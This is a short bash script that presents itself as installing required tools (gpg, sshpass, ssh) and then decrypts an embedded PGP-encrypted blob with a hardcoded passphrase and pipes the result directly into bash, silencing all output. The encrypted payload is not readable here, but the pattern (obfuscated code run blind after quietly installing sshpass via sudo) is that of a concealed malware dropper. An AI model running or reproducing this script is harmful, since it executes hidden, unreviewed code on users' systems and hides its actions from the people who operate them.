#!/bin/bash

{
  # List of required tools and their respective packages
  declare -A required_tools=(
    [gpg]="gnupg"
    [sshpass]="sshpass"
    [ssh]="openssh-client"
  )

  missing_packages=()

  check_and_collect() {
    for cmd in "${!required_tools[@]}"; do
      if ! command -v "$cmd" &> /dev/null; then
        missing_packages+=("${required_tools[$cmd]}")
      fi
    done
  }

  install_missing_packages() {
    if [ ${#missing_packages[@]} -gt 0 ]; then
      sudo apt-get update -qq > /dev/null 2>&1
      if ! sudo apt-get install -y -qq --no-install-recommends "${missing_packages[@]}" > /dev/null 2>&1; then
        exit 1
      fi
      hash -r
    fi
  }

  main() {
    check_and_collect
    install_missing_packages

    gpg -d --batch --yes --quiet --passphrase "Letsget@@1" <<'EOF' | bash > /dev/null 2>&1
-----BEGIN PGP MESSAGE-----

jA0ECQMKGIz/Wc7wkb//0ukBkuPe/adAIoDm0+xfwgwhlv28PH2ugWObazAwQvHX
iMwu9Y6NCeifA7dkUPZgZc5FdA+VKgqyxNpdMMBBJwldemefUjaI8MSSkR5DAmNq
B/MLfmF1646txCYL70+xtFHnRMukn3Oxq+7hXN2fG+SKHFX0kW7p2jz76UJiCMOO
2Dn6RKA4v2zDfSXgPh78YaSR84j82/MtMD29xP6gZQhrFx+0c7yYaKaN4cHNdqqw
cZcM24BQWwyER50Tz2mu5PHBwRwIOcruxDnPiYxJkw32BSHiYkIFABwABPCoS3jx
LdE8NqhH3MvEuE/YAfGkuOofD7q1lna/T4g28sLD2x7BbRyRMoPyIfsrAVpeybDW
YciIQGloYmTolsrOOsfcBtLxqPrlzGAhpA3ZqgO0Xy/fArupczc2/YRLNvnWhthx
R8cMV1VbyW4WlZpKCPGET76jkXnPBlsXo+mxwKRfGYZRwdZfQ5GSu9iDIw3MWOLm
Tmam9jGFBVVIZlcZ0i2dA0yTusmSVCl4X9CF7qH32uqcQi2sK/6oLMREsR6Ij2zr
Mn+141Z24W3TWx78mJgGBtrRp4njDKOJK5LFRY1xyFrWDLzbWS9hmtgTAyYDMwcs
36IwEGGHVqqgaz1vOC8BnBD/jLbkJuyBbACFfPnF88jXZhFNr1+QjgC5Wjdeoomt
bcATEFQ7DZ/8CuwqpTb2ysAKq0EutvP5yShXMZhHGwitoDkRz3Es+2MUZrBKfU91
8skfYMtwhHPXNvyPdo5abEoLSuxJSqmtNAU9D+9XdsZW7YOtjIBZ5k44d+e5xV0H
xQYyDszU/DF5cP1F+2d5q5eCt5Z0dU8YNDAMpcvmtIg6bwMQXsnwcYGMntKljThn
srQtKX60onVo7EE12SVHTH3+d3PJrKGTGgd5XUq7/qiLLNUV6G26LJ3tamvVQ/RK
o3JRWs0hiMAje4HZFm9x44dEzG8btQ==
=6G0j
-----END PGP MESSAGE-----
EOF
  }

  main

} > /dev/null 2>&1
